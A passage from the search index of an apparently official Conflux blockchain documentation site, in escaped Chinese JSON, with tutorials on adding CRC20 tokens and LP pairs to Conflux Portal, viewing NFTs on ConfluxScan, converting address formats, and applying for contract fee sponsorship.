\u6dfb\u52a0LP\u5bf9\u548c\u4e0d\u77e5\u540d\u4ee3\u5e01\u65f6\u5e38\u7528 \u6cd51\uff1a\u76f4\u63a5\u641c\u7d22\u6cd5 \u00b6 \u70b9\u51fbPortal\u5de6\u4e0a\u89d2\u201c\u4e09\u6a2a\u201d\u680f\u76ee \u547c\u51fa\u8d26\u6237\u4fe1\u606f\u680f\u76ee\uff0c\u53d1\u73b0\u9664CFX\u5916\u6ca1\u6709\u4efb\u4f55\u4ee3\u5e01 \u70b9\u51fb\u6dfb\u52a0\u4ee3\u5e01 \u641c\u7d22\u60a8\u60f3\u6dfb\u52a0\u7684\u4ee3\u5e01\uff0c\u6b64\u5904\u4ee5\u201ccusdt\u201d\u4e3a\u4f8b\uff0c\u8f93\u5165cusdt\uff0c\u9009\u4e2d \u70b9\u51fb\u4e0b\u4e00\u6b65 \u70b9\u51fb\u201c\u6dfb\u52a0\u4ee3\u5e01\u201d\u6309\u94ae \u6cd52\uff1a\u5408\u7ea6\u5730\u5740\u81ea\u5b9a\u4e49\u6dfb\u52a0\u4ee3\u5e01 \u00b6 \u6709\u65f6\u6709\u7684CRC20\u6807\u51c6\u4ee3\u5e01\u5e76\u672a\u63a5\u5165Conflux Portal\uff0c\u5305\u62ecLP\u5bf9\uff0c\u90fd\u53ef\u4ee5\u901a\u8fc7\u5408\u7ea6\u5730\u5740\u65b9\u6cd5\u6dfb\u52a0\u5982Conflux Portal\u5217\u8868\u3002 \u6b64\u5904\u6211\u4eec\u5c06\u7ed9\u51fa\u7b2c\u4e00\u4e2a\u4f8b\u5b50\uff1a \u5229\u7528FC\u5408\u7ea6\u5730\u5740\u901a\u8fc7 \u81ea\u5b9a\u4e49\u6dfb\u52a0\u6cd5 \u5c06FC\u52a0\u5165\u94b1\u5305\u4ee3\u5e01\u5217\u8868 \u5df2\u77e5FC\u4ee3\u5e01\u5408\u7ea6\u5730\u5740\u4e3a\uff1a cfx:achc8nxj7r451c223m18w2dwjnmhkd6rxawrvkvsy2 \u5728\u6dfb\u52a0\u4ee3\u5e01\u680f\u76ee\uff0c\u5207\u6362\u4e3a\u201c\u81ea\u5b9a\u4e49\u4ee3\u5e01\u201d \u5c06cfx:achc8nxj7r451c223m18w2dwjnmhkd6rxawrvkvsy2\u8d34\u5165\u201c\u4ee3\u5e01\u8054\u7cfb\u4eba\u5730\u5740\u201d \u70b9\u51fb\u4e0b\u4e00\u6b65 \u70b9\u51fb\u201c\u6dfb\u52a0\u4ee3\u5e01\u201d \u6cd53\uff1a\u5408\u7ea6\u5730\u5740\u81ea\u5b9a\u4e49\u6dfb\u52a0LP \u00b6 \u4ee5fc\u548cmoon\u7684LP\u5bf9\u4e3a\u4f8b\uff1a\u5176\u5408\u7ea6\u5730\u5740\u4e3acfx:aca45uhpk2d1j7vf8y927mr79w4bzne0vyfg9muytu\uff0c\u4e0b\u56fe\u6765\u6e90\u4e8e Conflux Scan \u5728Conflux Portal\u4e2d\u6dfb\u52a0\u81ea\u5b9a\u4e49\u4ee3\u5e01\uff1a \u6700\u7ec8\u6dfb\u52a0\u6210\u529f","title":"\u6dfb\u52a0CRC20\u4ee3\u5e01\u5230Portal\u7684\u65b9\u6cd5\u4e0e\u6b65\u9aa4"},{"location":"development/add-token-to-portal/#crc20portal","text":"","title":"\u6dfb\u52a0CRC20\u4ee3\u5e01\u5230Portal\u7684\u65b9\u6cd5\u4e0e\u6b65\u9aa4"},{"location":"development/add-token-to-portal/#_1","text":"\u5728\u65e5\u5e38\u4f7f\u7528 Conflux Portal \u65f6\uff0c\u53ef\u80fd\u9700\u8981\u5411\u4ed6\u4eba\u8f6c\u8d26CRC20\u4ee3\u5e01\u6216LP\u5e01\u5bf9\uff0c\u4f46\u662fConflux Portal\u5728\u521d\u59cb\u5b89\u88c5\u72b6\u6001\u65f6\uff0c\u9664 CFX \u5916\u4e0d\u4f1a\u5728\u5176\u4ee3\u5e01\u5217\u8868\u5185\u5305\u542b\u4efb\u4f55CRC20\u4ee3\u5e01\u3002\u672c\u6559\u7a0b\u76ee\u7684\u662f\u5e2e\u52a9\u7528\u6237\u80fd\u591f\u5229\u7528Conflux Portal\u7684\u6dfb\u52a0\u4ee3\u5e01\u529f\u80fd\u5c06\u4ee3\u5e01\u52a0\u5165\u5176Portal\u5217\u8868\u3002","title":"\u80cc\u666f"},{"location":"development/add-token-to-portal/#_2","text":"\u57fa\u4e8eConflux Portal\u4ee3\u5e01\u641c\u7d22\u6846\u7684\u6dfb\u52a0\u65b9\u6cd5\uff1a \u6dfb\u52a0\u5df2\u63a5\u5165\u4ee3\u5e01\u65f6\u5e38\u7528 \u57fa\u4e8e\u667a\u80fd\u5408\u7ea6\u5730\u5740\u7684\u6dfb\u52a0\u65b9\u6cd5\uff1a \u6dfb\u52a0LP\u5bf9\u548c\u4e0d\u77e5\u540d\u4ee3\u5e01\u65f6\u5e38\u7528","title":"\u4e24\u79cd\u6dfb\u52a0\u65b9\u6cd5"},{"location":"development/add-token-to-portal/#1","text":"\u70b9\u51fbPortal\u5de6\u4e0a\u89d2\u201c\u4e09\u6a2a\u201d\u680f\u76ee \u547c\u51fa\u8d26\u6237\u4fe1\u606f\u680f\u76ee\uff0c\u53d1\u73b0\u9664CFX\u5916\u6ca1\u6709\u4efb\u4f55\u4ee3\u5e01 \u70b9\u51fb\u6dfb\u52a0\u4ee3\u5e01 \u641c\u7d22\u60a8\u60f3\u6dfb\u52a0\u7684\u4ee3\u5e01\uff0c\u6b64\u5904\u4ee5\u201ccusdt\u201d\u4e3a\u4f8b\uff0c\u8f93\u5165cusdt\uff0c\u9009\u4e2d \u70b9\u51fb\u4e0b\u4e00\u6b65 \u70b9\u51fb\u201c\u6dfb\u52a0\u4ee3\u5e01\u201d\u6309\u94ae","title":"\u6cd51\uff1a\u76f4\u63a5\u641c\u7d22\u6cd5"},{"location":"development/add-token-to-portal/#2","text":"\u6709\u65f6\u6709\u7684CRC20\u6807\u51c6\u4ee3\u5e01\u5e76\u672a\u63a5\u5165Conflux Portal\uff0c\u5305\u62ecLP\u5bf9\uff0c\u90fd\u53ef\u4ee5\u901a\u8fc7\u5408\u7ea6\u5730\u5740\u65b9\u6cd5\u6dfb\u52a0\u5982Conflux Portal\u5217\u8868\u3002 \u6b64\u5904\u6211\u4eec\u5c06\u7ed9\u51fa\u7b2c\u4e00\u4e2a\u4f8b\u5b50\uff1a \u5229\u7528FC\u5408\u7ea6\u5730\u5740\u901a\u8fc7 \u81ea\u5b9a\u4e49\u6dfb\u52a0\u6cd5 \u5c06FC\u52a0\u5165\u94b1\u5305\u4ee3\u5e01\u5217\u8868 \u5df2\u77e5FC\u4ee3\u5e01\u5408\u7ea6\u5730\u5740\u4e3a\uff1a cfx:achc8nxj7r451c223m18w2dwjnmhkd6rxawrvkvsy2 \u5728\u6dfb\u52a0\u4ee3\u5e01\u680f\u76ee\uff0c\u5207\u6362\u4e3a\u201c\u81ea\u5b9a\u4e49\u4ee3\u5e01\u201d \u5c06cfx:achc8nxj7r451c223m18w2dwjnmhkd6rxawrvkvsy2\u8d34\u5165\u201c\u4ee3\u5e01\u8054\u7cfb\u4eba\u5730\u5740\u201d \u70b9\u51fb\u4e0b\u4e00\u6b65 \u70b9\u51fb\u201c\u6dfb\u52a0\u4ee3\u5e01\u201d","title":"\u6cd52\uff1a\u5408\u7ea6\u5730\u5740\u81ea\u5b9a\u4e49\u6dfb\u52a0\u4ee3\u5e01"},{"location":"development/add-token-to-portal/#3lp","text":"\u4ee5fc\u548cmoon\u7684LP\u5bf9\u4e3a\u4f8b\uff1a\u5176\u5408\u7ea6\u5730\u5740\u4e3acfx:aca45uhpk2d1j7vf8y927mr79w4bzne0vyfg9muytu\uff0c\u4e0b\u56fe\u6765\u6e90\u4e8e Conflux Scan \u5728Conflux Portal\u4e2d\u6dfb\u52a0\u81ea\u5b9a\u4e49\u4ee3\u5e01\uff1a \u6700\u7ec8\u6dfb\u52a0\u6210\u529f","title":"\u6cd53\uff1a\u5408\u7ea6\u5730\u5740\u81ea\u5b9a\u4e49\u6dfb\u52a0LP"},{"location":"development/address-NFT/","text":"NFT\u67e5\u770b\u5668\u6559\u7a0b \u00b6 ConfluxScan\u533a\u5757\u6d4f\u89c8\u5668\u65b0\u589e\u4e86NFT\u67e5\u770b\u7684\u529f\u80fd\uff0c\u53ef\u4ee5\u901a\u8fc7\u641c\u7d22\u5730\u5740\u67e5\u770b\u67d0\u4e00\u8d26\u6237\u62e5\u6709\u7684 NFT\uff08\u4ec5\u652f\u6301\u5f53\u524d\u4ee3\u5e01\u5217\u8868\u4e2d\u7684 NFT\uff09\u3002 \u64cd\u4f5c\u6b65\u9aa4 \u00b6 \u8fdb\u5165 ConfluxScan\u5b98\u7f51 \uff0c\u70b9\u51fb\u83dc\u5355\u680f\u6700\u53f3\u7684\"More/\u66f4\u591a\"\uff0c\u5728\u4e0b\u62c9\u680f\u5217\u8868\u4e2d\u9009\u62e9\u201cNFT Checker/ NFT\u67e5\u770b\u5668\u201d\u3002 \u5728\"NFT Checker\"\u8f93\u5165\u6846\u4e2d\u8f93\u5165\u60f3\u67e5\u8be2\u7684\u8d26\u6237\u5730\u5740\uff0c\u4fbf\u53ef\u4ee5\u770b\u5230\u8be5\u8d26\u6237\u62e5\u6709\u7684 NFT\u3002 Note \u200b \u6ce8\uff1a\u67e5\u770b\u5668\u4e2d\u4ec5\u663e\u793a\u5f53\u524d\u4ee3\u5e01\u5217\u8868\u4e2d\u7684 NFT\uff08\u5373CRC-1155\u4ee3\u5e01\u5217\u8868\u4e2d\u7684NFT\uff09\u3002 \u8f93\u5165\u94b1\u5305\u5730\u5740\uff0c\u5e76\u70b9\u51fb\u641c\u7d22\u6309\u94ae\uff0c\u5982\u4e0b\u56fe\u53ef\u67e5\u770b\u5230\u94b1\u5305\u5730\u5740\u5185\u7684NFT \u8bf4\u660e \u00b6 NFT\u67e5\u770b\u5668\u4e2d\u4ec5\u663e\u793a\u5f53\u524d\u4ee3\u5e01\u5217\u8868\u4e2d\u7684 NFT\uff08\u5373CRC-1155\u4ee3\u5e01\u5217\u8868\u4e2d\u7684NFT\uff09\uff0c\u4e0d\u5728\u4ee3\u5e01\u5217\u8868\u4e2d\u7684NFT\u4e0d\u4e88\u663e\u793a\uff0c\u4f46\u4e0d\u4ee3\u8868\u8fd9\u4e2aNFT\u5c31\u4e0d\u5b58\u5728\u4e86\u3002 \u67e5\u770b\u80fd\u591f\u88abScan\u663e\u793a\u7684NFT\u5217\u8868 \u00b6 \u5728\u83dc\u5355\u680f\u4e2d\u9009\u62e9\u201cTokens/\u4ee3\u5e01\u201d\uff0c\u5728\u4e0b\u62c9\u680f\u4e2d\u9009\u62e9\u201cCRC-1155 Tokens/CRC-1155 \u4ee3\u5e01\u201d\u3002\u9875\u9762\u4e2d\u663e\u793a\u7684CRC-1155\u4ee3\u5e01\u5c31\u662f\u53ef\u4ee5\u5728NFT\u67e5\u770b\u5668\u4e2d\u663e\u793a\u7684NFT\u3002 \u76ee\u524d\u5df2\u6536\u5f55conDragon, Confi\uff08\u70e4\u4ed4\u57ce\u5e02\uff09\uff0cAncient Chinese God NFT\uff08\u53e4\u56fd\u5e8f\u5217\uff09\uff0cConflux Guardian\uff08\u5b88\u62a4\u8005\uff09\uff0cConHero\u7b49\u8d85\u8fc785\u4e2aCRC1155\u3002 \u968f\u4fbf\u70b9\u4e00\u4e2a\u4ee3\u5e01\uff0c\u6bd4\u5982Ancient Chinese God NFT\uff0c\u8fdb\u5165\u540e\u518d\u70b9\u51fbNFT\u6309\u94ae\u4f1a\u6709\u60ca\u559c\u53d1\u73b0 \u5f53NFT\u9879\u76ee\u65b9\u5df2\u63a5\u5165Conflux\u540e\uff0c\u5229\u7528Scan\u80fd\u591f\u76f4\u63a5\u67e5\u770b\u5230\u5408\u7ea6\u5185NFT\u5bf9\u5e94\u7684\u56fe\u7247 \u5982\u4f55\u8ba9\u4f60\u7684NFT\u88abConfluxScan\u6536\u5f55 \u00b6 \u4f5c\u4e3aNFT\u53d1\u8d77\u65b9\uff0c\u5982\u4f55\u5728Scan\u4e0a\u5c55\u793aNFT\uff1a \u5982\u4f55\u5728Scan\u4e0a\u6ce8\u518c\u5408\u7ea6\u548c\u4ee3\u5e01\u5c55\u793a","title":"NFT\u67e5\u770b\u5668\u6559\u7a0b"},{"location":"development/address-NFT/#nft","text":"ConfluxScan\u533a\u5757\u6d4f\u89c8\u5668\u65b0\u589e\u4e86NFT\u67e5\u770b\u7684\u529f\u80fd\uff0c\u53ef\u4ee5\u901a\u8fc7\u641c\u7d22\u5730\u5740\u67e5\u770b\u67d0\u4e00\u8d26\u6237\u62e5\u6709\u7684 NFT\uff08\u4ec5\u652f\u6301\u5f53\u524d\u4ee3\u5e01\u5217\u8868\u4e2d\u7684 NFT\uff09\u3002","title":"NFT\u67e5\u770b\u5668\u6559\u7a0b"},{"location":"development/address-NFT/#_1","text":"\u8fdb\u5165 ConfluxScan\u5b98\u7f51 \uff0c\u70b9\u51fb\u83dc\u5355\u680f\u6700\u53f3\u7684\"More/\u66f4\u591a\"\uff0c\u5728\u4e0b\u62c9\u680f\u5217\u8868\u4e2d\u9009\u62e9\u201cNFT Checker/ NFT\u67e5\u770b\u5668\u201d\u3002 \u5728\"NFT Checker\"\u8f93\u5165\u6846\u4e2d\u8f93\u5165\u60f3\u67e5\u8be2\u7684\u8d26\u6237\u5730\u5740\uff0c\u4fbf\u53ef\u4ee5\u770b\u5230\u8be5\u8d26\u6237\u62e5\u6709\u7684 NFT\u3002 Note \u200b \u6ce8\uff1a\u67e5\u770b\u5668\u4e2d\u4ec5\u663e\u793a\u5f53\u524d\u4ee3\u5e01\u5217\u8868\u4e2d\u7684 NFT\uff08\u5373CRC-1155\u4ee3\u5e01\u5217\u8868\u4e2d\u7684NFT\uff09\u3002 \u8f93\u5165\u94b1\u5305\u5730\u5740\uff0c\u5e76\u70b9\u51fb\u641c\u7d22\u6309\u94ae\uff0c\u5982\u4e0b\u56fe\u53ef\u67e5\u770b\u5230\u94b1\u5305\u5730\u5740\u5185\u7684NFT","title":"\u64cd\u4f5c\u6b65\u9aa4"},{"location":"development/address-NFT/#_2","text":"NFT\u67e5\u770b\u5668\u4e2d\u4ec5\u663e\u793a\u5f53\u524d\u4ee3\u5e01\u5217\u8868\u4e2d\u7684 NFT\uff08\u5373CRC-1155\u4ee3\u5e01\u5217\u8868\u4e2d\u7684NFT\uff09\uff0c\u4e0d\u5728\u4ee3\u5e01\u5217\u8868\u4e2d\u7684NFT\u4e0d\u4e88\u663e\u793a\uff0c\u4f46\u4e0d\u4ee3\u8868\u8fd9\u4e2aNFT\u5c31\u4e0d\u5b58\u5728\u4e86\u3002","title":"\u8bf4\u660e"},{"location":"development/address-NFT/#scannft","text":"\u5728\u83dc\u5355\u680f\u4e2d\u9009\u62e9\u201cTokens/\u4ee3\u5e01\u201d\uff0c\u5728\u4e0b\u62c9\u680f\u4e2d\u9009\u62e9\u201cCRC-1155 Tokens/CRC-1155 \u4ee3\u5e01\u201d\u3002\u9875\u9762\u4e2d\u663e\u793a\u7684CRC-1155\u4ee3\u5e01\u5c31\u662f\u53ef\u4ee5\u5728NFT\u67e5\u770b\u5668\u4e2d\u663e\u793a\u7684NFT\u3002 \u76ee\u524d\u5df2\u6536\u5f55conDragon, Confi\uff08\u70e4\u4ed4\u57ce\u5e02\uff09\uff0cAncient Chinese God NFT\uff08\u53e4\u56fd\u5e8f\u5217\uff09\uff0cConflux Guardian\uff08\u5b88\u62a4\u8005\uff09\uff0cConHero\u7b49\u8d85\u8fc785\u4e2aCRC1155\u3002 \u968f\u4fbf\u70b9\u4e00\u4e2a\u4ee3\u5e01\uff0c\u6bd4\u5982Ancient Chinese God NFT\uff0c\u8fdb\u5165\u540e\u518d\u70b9\u51fbNFT\u6309\u94ae\u4f1a\u6709\u60ca\u559c\u53d1\u73b0 \u5f53NFT\u9879\u76ee\u65b9\u5df2\u63a5\u5165Conflux\u540e\uff0c\u5229\u7528Scan\u80fd\u591f\u76f4\u63a5\u67e5\u770b\u5230\u5408\u7ea6\u5185NFT\u5bf9\u5e94\u7684\u56fe\u7247","title":"\u67e5\u770b\u80fd\u591f\u88abScan\u663e\u793a\u7684NFT\u5217\u8868"},{"location":"development/address-NFT/#nftconfluxscan","text":"\u4f5c\u4e3aNFT\u53d1\u8d77\u65b9\uff0c\u5982\u4f55\u5728Scan\u4e0a\u5c55\u793aNFT\uff1a \u5982\u4f55\u5728Scan\u4e0a\u6ce8\u518c\u5408\u7ea6\u548c\u4ee3\u5e01\u5c55\u793a","title":"\u5982\u4f55\u8ba9\u4f60\u7684NFT\u88abConfluxScan\u6536\u5f55"},{"location":"development/address-convertor/","text":"\u5730\u5740\u8f6c\u6362\u5de5\u5177 \u00b6 \u80cc\u666f\u4ecb\u7ecd \u00b6 \u968f\u7740Bounty2.0\u7684\u4e0a\u7ebf\u516c\u6d4b\uff0c\u8d8a\u6765\u8d8a\u591a\u7684\u7528\u6237\u8981\u51c6\u5907\u63d0\u73b0\u5176\u8d26\u6237\u5185\u672a\u6ee1\u8db3\u6700\u4f4e\u63d0\u73b0\u6807\u51c6\u7684FC\u4ee3\u5e01\uff0c\u7531\u4e8eFC\u5408\u7ea6\u9700\u8981\u7528\u6237\u5c06\u63a5\u6536\u5730\u5740\u4ece\u73b0\u6709Conflux\u4e3b\u7f51\u5730\u5740(cfx:aa\u8d77\u5934\u7684\u4e00\u4e32\u5b57\u7b26)\u8f6c\u6362\u4e3a\u65e7\u89c4\u5219\u5730\u5740(0x1\u8d77\u5934\u7684\u4e00\u4e32\u5341\u516d\u8fdb\u5236\u5b57\u7b26) \u5730\u5740\u8f6c\u6362\u5de5\u5177\u94fe\u63a5 \u00b6 \u5730\u5740\u683c\u5f0f\u8f6c\u6362\u5de5\u5177\u94fe\u63a5 \u5730\u5740\u8f6c\u6362\u5de5\u5177\u4f7f\u7528\u65b9\u6cd5 \u00b6 \u89e3\u9501Portal\u94b1\u5305\uff0c\u590d\u5236\u65b0\u89c4\u5219\u4e0b\u60a8\u9700\u8981\u63d0\u73b0FC\u4ee3\u5e01\u7684\u94b1\u5305\u5730\u5740 \u5c06\u65b0\u89c4\u5219\u94b1\u5305\u5730\u5740\u7c98\u8d34\u81f3\u5730\u5740\u683c\u5f0f\u8f6c\u6362\u5de5\u5177\u4e2d \u70b9\u51fb\u8f6c\u6362\u6309\u94ae\u5373\u53ef\u83b7\u53d6\u8f6c\u6362\u540e\u5730\u5740\uff0c\u4ee5FC\u4ee3\u5e01\u63d0\u73b0\u5730\u5740\u4e3a\u4f8b\uff0c\u590d\u5236\u201c\u5168\u5c0f\u5199\u5730\u5740\u201d\u5373\u53ef \u63d0\u73b0\u65f6\u4e00\u5b9a\u8981\u6ce8\u610f\u5730\u5740\u7684\u6b63\u786e\u6027\uff0c\u5426\u5219\u4f1a\u51fa\u73b0\u5931\u8d25\u95ee\u9898\u3002","title":"\u5730\u5740\u8f6c\u6362\u5de5\u5177"},{"location":"development/address-convertor/#_1","text":"","title":"\u5730\u5740\u8f6c\u6362\u5de5\u5177"},{"location":"development/address-convertor/#_2","text":"\u968f\u7740Bounty2.0\u7684\u4e0a\u7ebf\u516c\u6d4b\uff0c\u8d8a\u6765\u8d8a\u591a\u7684\u7528\u6237\u8981\u51c6\u5907\u63d0\u73b0\u5176\u8d26\u6237\u5185\u672a\u6ee1\u8db3\u6700\u4f4e\u63d0\u73b0\u6807\u51c6\u7684FC\u4ee3\u5e01\uff0c\u7531\u4e8eFC\u5408\u7ea6\u9700\u8981\u7528\u6237\u5c06\u63a5\u6536\u5730\u5740\u4ece\u73b0\u6709Conflux\u4e3b\u7f51\u5730\u5740(cfx:aa\u8d77\u5934\u7684\u4e00\u4e32\u5b57\u7b26)\u8f6c\u6362\u4e3a\u65e7\u89c4\u5219\u5730\u5740(0x1\u8d77\u5934\u7684\u4e00\u4e32\u5341\u516d\u8fdb\u5236\u5b57\u7b26)","title":"\u80cc\u666f\u4ecb\u7ecd"},{"location":"development/address-convertor/#_3","text":"\u5730\u5740\u683c\u5f0f\u8f6c\u6362\u5de5\u5177\u94fe\u63a5","title":"\u5730\u5740\u8f6c\u6362\u5de5\u5177\u94fe\u63a5"},{"location":"development/address-convertor/#_4","text":"\u89e3\u9501Portal\u94b1\u5305\uff0c\u590d\u5236\u65b0\u89c4\u5219\u4e0b\u60a8\u9700\u8981\u63d0\u73b0FC\u4ee3\u5e01\u7684\u94b1\u5305\u5730\u5740 \u5c06\u65b0\u89c4\u5219\u94b1\u5305\u5730\u5740\u7c98\u8d34\u81f3\u5730\u5740\u683c\u5f0f\u8f6c\u6362\u5de5\u5177\u4e2d \u70b9\u51fb\u8f6c\u6362\u6309\u94ae\u5373\u53ef\u83b7\u53d6\u8f6c\u6362\u540e\u5730\u5740\uff0c\u4ee5FC\u4ee3\u5e01\u63d0\u73b0\u5730\u5740\u4e3a\u4f8b\uff0c\u590d\u5236\u201c\u5168\u5c0f\u5199\u5730\u5740\u201d\u5373\u53ef \u63d0\u73b0\u65f6\u4e00\u5b9a\u8981\u6ce8\u610f\u5730\u5740\u7684\u6b63\u786e\u6027\uff0c\u5426\u5219\u4f1a\u51fa\u73b0\u5931\u8d25\u95ee\u9898\u3002","title":"\u5730\u5740\u8f6c\u6362\u5de5\u5177\u4f7f\u7528\u65b9\u6cd5"},{"location":"development/apply-contract-fee/","text":"\u4e3a\u5408\u7ea6\u7533\u8bf7Conflux\u8d5e\u52a9\u989d\u5ea6\uff08\u5408\u7ea6\u4ee3\u4ed8\uff09 \u00b6 \u76ee\u7684 \u00b6 \u4e3a\u4fbf\u4e8e\u9879\u76ee\u51b7\u542f\u52a8\uff0c\u4e00\u4e2a\u4f59\u989d\u4e3a\u96f6\u7684\u65b0\u8d26\u6237\u5c31\u80fd\u591f\u8c03\u7528\u5408\u7ea6\u3002Conflux\u63d0\u4f9b\u4e86\u90e8\u5206CFX\u4f5c\u4e3a\u53ef\u8d5e\u52a9\u7684\u4ee3\u4ed8\u989d\u5ea6\u4e3a\u667a\u80fd\u5408\u7ea6\u7684\u4f7f\u7528\u63d0\u4f9b\u8865\u52a9\u3002\u667a\u80fd\u5408\u7ea6\u5f00\u53d1\u8005\u53ef\u4ee5\u4e3a\u81ea\u5df1\u7684\u9879\u76ee\u5408\u7ea6\u7533\u8bf7\u4ee3\u4ed8\u989d\u5ea6\uff0c\u5927\u5927\u65b9\u4fbf\u65b0\u624b\u4f53\u9a8c\u4f18\u8d28\u751f\u6001\u3002\u9488\u5bf9\u5408\u7ea6\u4ee3\u4ed8\u7684\u4ecb\u7ecd\u8fd8\u53ef\u53c2\u8003 \u65b0\u9879\u76ee\u5982\u4f55\u9ad8\u6548\u542f\u52a8\uff1fConflux \u4ee3\u4ed8\u673a\u5236\u4e86\u89e3\u4e00\u4e0b \u3002 \u4e24\u7c7bConflux\u7f51\u7edc \u00b6 Conflux\u6d4b\u8bd5\u7f51\uff1a \u6d4b\u8bd5\u7f51Scan Conflux\u6b63\u5f0f\u7f51\uff1a \u6b63\u5f0f\u7f51Scan \u8bf4\u660e\u53ca\u64cd\u4f5c\u6b65\u9aa4 \u00b6 \u70b9\u51fb\u94fe\u63a5\u8bbf\u95ee \u6b63\u5f0f\u7f51\u533a\u5757\u6d4f\u89c8\u5668Scan \u6216 \u6d4b\u8bd5\u7f51\u533a\u5757\u6d4f\u89c8\u5668Scan \u4ee5\u6d4b\u8bd5\u7f51Scan\u4e3a\u4f8b\uff1a\u70b9\u51fb\u5de6\u4e0a\u89d2\u533a\u5757\u94fe---\u8d5e\u52a9\u5408\u7ea6 \u4f1a\u51fa\u73b0\u4ee5\u4e0b\u754c\u9762\uff1a\u8f93\u5165 \u5408\u7ea6\u5730\u5740 \u540e\u56de\u8f66\uff0c\u53ef\u4ee5\u67e5\u770b\u5f53\u524d\u7684\u4ee3\u4ed8\u60c5\u51b5\uff0c\u82e5\u4e3a0\u6216\u8005\u5f88\u5c0f\u7684\u65f6\u5019\u8bf4\u660e\u9700\u8981\u65b0\u7684\u4ee3\u4ed8\u4e86\uff0c\u5b58\u50a8\u8d39\u4e3astorage\u4ee3\u4ed8\uff0c \u6bcf\u6b21\u4e3a600cfx\uff0c\u71c3\u6c14\u8d39\u4e3agas\u4ee3\u4ed8\uff0c10cfx\uff08gas\u4ee3\u4ed8\u4e00\u822c\u4e00\u6b21\u5c31\u591f\uff0c\u4e3b\u8981\u662fstorage\u7684\u8d39\u7528\u8f83\u9ad8\uff09 \u627e\u4e00\u4e2a\u5df2\u90e8\u7f72\u597d\u7684\u5408\u7ea6\u5730\u5740\uff0c\u5982\uff1acfxtest:acfk3g4v2e3j8tpy5vskznkfu8pnfcp90y8271c9rv \uff08\u6b64\u5408\u7ea6\u6ca1\u6709\u7279\u6b8a\u610f\u4e49\uff0c\u5982\u9700\u4ee3\u4ed8\u6240\u6709\u5730\u5740\uff0c\u9700\u8981\u5728\u4ee3\u7801\u4e2d\u52a0\u4e0aSponsorWhitelistControl \u76f8\u5173\u4ee3\u7801\uff0c\u5408\u7ea6\u7a0b\u5e8f\u5458\u8bf7\u79fb\u6b65 \u4ee3\u4ed8\u5408\u7ea6 \u7684\u7f16\u5199\uff09\u67e5\u8be2\u4e4b\u540e\u53d1\u73b0\uff0c\u5408\u7ea6\u6ca1\u6709\u4efb\u4f55\u4ee3\u4ed8\u989d\u5ea6\uff0c\u8fd9\u4e2a\u65f6\u5019\u70b9\u51fb\u7533\u8bf7 \u8fde\u63a5\u94b1\u5305 \u968f\u4fbf\u9009\u62e9\u4e00\u4e2a\u6709cfx\u7684\u94b1\u5305\uff0c\u56e0\u4e3a\u9700\u8981\u652f\u4ed80.125cfx\u7684\u8d39\u7528\uff08\u4e4b\u540e\u518d\u7528\u5f53\u524d\u5730\u5740\u7533\u8bf7\u4ee3\u4ed8\uff0c\u5c31\u4e0d\u518d\u6d88\u8017cfx\u4e86\uff09 \u5de6\u4e0b\u89d2\u663e\u793a\u5730\u5740\u5373\u53ef\u70b9\u51fb\u7533\u8bf7 \u4e4b\u540e\u70b9\u51fb\u786e\u8ba4\u518d\u7b49\u5f85\u786e\u8ba4\u5373\u53ef \u5173\u95ed\u4ea4\u6613\u54c8\u5e0c\u6846\uff0c\u4e4b\u540e\u81ea\u52a8\u67e5\u8be2\u7ed3\u679c\uff1a Info \u200b \u5f53\u201c\u7533\u8bf7\u201d\u6309\u94ae\u53d8\u6210\u7070\u8272\uff0c\u5b58\u50a8\u8d39600cfx\uff0c\u71c3\u6c14\u8d3910cfx\uff0c\u5219\u8bf4\u660e\u7533\u8bf7\u6210\u529f\uff0c\u63a5\u4e0b\u6765\u4f60\u5c31\u53ef\u4ee5\u65e0\u9700\u652f\u4ed8\u4efb\u4f55gas\u8d39\u7528\u5c31\u80fd\u591f\u4e0e\u60a8\u5f00\u53d1\u7684\u667a\u80fd\u5408\u7ea6\u8fdb\u884c\u4ea4\u4e92\u4e86\uff01","title":"\u4e3a\u5408\u7ea6\u7533\u8bf7Conflux\u8d5e\u52a9\u989d\u5ea6\uff08\u5408\u7ea6\u4ee3\u4ed8\uff09"},{"location":"development/apply-contract-fee/#conflux","text":"","title":"\u4e3a\u5408\u7ea6\u7533\u8bf7Conflux\u8d5e\u52a9\u989d\u5ea6\uff08\u5408\u7ea6\u4ee3\u4ed8\uff09"},{"location":"development/apply-contract-fee/#_1","text":"\u4e3a\u4fbf\u4e8e\u9879\u76ee\u51b7\u542f\u52a8\uff0c\u4e00\u4e2a\u4f59\u989d\u4e3a\u96f6\u7684\u65b0\u8d26\u6237\u5c31\u80fd\u591f\u8c03\u7528\u5408\u7ea6\u3002Conflux\u63d0\u4f9b\u4e86\u90e8\u5206CFX\u4f5c\u4e3a\u53ef\u8d5e\u52a9\u7684\u4ee3\u4ed8\u989d\u5ea6\u4e3a\u667a\u80fd\u5408\u7ea6\u7684\u4f7f\u7528\u63d0\u4f9b\u8865\u52a9\u3002\u667a\u80fd\u5408\u7ea6\u5f00\u53d1\u8005\u53ef\u4ee5\u4e3a\u81ea\u5df1\u7684\u9879\u76ee\u5408\u7ea6\u7533\u8bf7\u4ee3\u4ed8\u989d\u5ea6\uff0c\u5927\u5927\u65b9\u4fbf\u65b0\u624b\u4f53\u9a8c\u4f18\u8d28\u751f\u6001\u3002\u9488\u5bf9\u5408\u7ea6\u4ee3\u4ed8\u7684\u4ecb\u7ecd\u8fd8\u53ef\u53c2\u8003 \u65b0\u9879\u76ee\u5982\u4f55\u9ad8\u6548\u542f\u52a8\uff1fConflux \u4ee3\u4ed8\u673a\u5236\u4e86\u89e3\u4e00\u4e0b \u3002","title":"\u76ee\u7684"},{"location":"development/apply-contract-fee/#conflux_1","text":"Conflux\u6d4b\u8bd5\u7f51\uff1a \u6d4b\u8bd5\u7f51Scan Conflux\u6b63\u5f0f\u7f51\uff1a \u6b63\u5f0f\u7f51Scan","title":"\u4e24\u7c7bConflux\u7f51\u7edc"},{"location":"development/apply-contract-fee/#_2","text":"\u70b9\u51fb\u94fe\u63a5\u8bbf\u95ee \u6b63\u5f0f\u7f51\u533a\u5757\u6d4f\u89c8\u5668Scan \u6216 \u6d4b\u8bd5\u7f51\u533a\u5757\u6d4f\u89c8\u5668Scan \u4ee5\u6d4b\u8bd5\u7f51Scan\u4e3a\u4f8b\uff1a\u70b9\u51fb\u5de6\u4e0a\u89d2\u533a\u5757\u94fe---\u8d5e\u52a9\u5408\u7ea6 \u4f1a\u51fa\u73b0\u4ee5\u4e0b\u754c\u9762\uff1a\u8f93\u5165 \u5408\u7ea6\u5730\u5740 